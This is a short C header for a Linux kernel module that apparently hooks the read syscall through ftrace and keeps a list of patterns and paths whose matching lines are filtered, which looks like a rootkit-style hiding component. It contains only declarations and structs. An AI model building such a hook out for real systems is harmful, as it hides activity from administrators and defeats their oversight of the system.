#ifndef SYSCALL_HOOK_H
#define SYSCALL_HOOK_H

#include <linux/types.h>
#include <linux/ftrace.h>


void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs);
asmlinkage long hook_read(const struct pt_regs *regs);

int wlkom_syscall_hook_init(void);
void wlkom_syscall_hook_exit(void);

void wlkom_hide_free(void);
int wlkom_hide_add(const char *pattern, const char *path);

extern struct line_hidded *hide_list;


struct line_hidded
{
    char *str_pattern; // keyword that will be used to filter or not a line
    char *path;
    struct line_hidded *next;
};

struct ftrace_hook 
{
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};


#endif